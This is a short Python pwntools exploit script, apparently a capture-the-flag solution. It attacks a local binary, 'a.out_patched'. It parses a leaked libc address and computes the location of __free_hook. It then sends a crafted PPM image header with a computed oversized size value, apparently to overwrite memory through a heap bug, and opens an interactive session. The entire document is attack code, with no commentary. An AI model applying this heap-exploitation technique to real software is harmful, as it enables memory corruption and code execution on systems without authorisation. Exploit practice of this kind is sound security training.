from pwn import *
context.terminal = ["terminator", "-e"]

libc_base_offset = 0x7f28532e1020-0x007f285324a000


malloc_base = 0x00000000602000
heap_b_offset = 0x1bed2b0





p = process("./a.out_patched")
gdb.attach(p, '''
b *0x0000000000400e77
c''')
print(p.recvuntil("leak "))
leak_base = int(p.recvuntil("\n")[2:], 16)-libc_base_offset
log.info("Got leak: " + str(hex(leak_base)))

free_hook = leak_base+(0x7fc0f2e6b8e8-0x007fc0f2a7e000)
log.info("Free hook addr: " + str(hex(free_hook)))

size = (free_hook-heap_b_offset)-(16)
fp = f"""P3
2753074036095 6700417
{str(size)}
255 255 255 255 255 255 255 255 255 255 255 255
100 100 100 100 100 100 200 200 200 200 200 200
240  255  255  255  255  255  255  255  20  20  20  20

"""

p.send(fp)
p.shutdown()
p.interactive()
print(fp)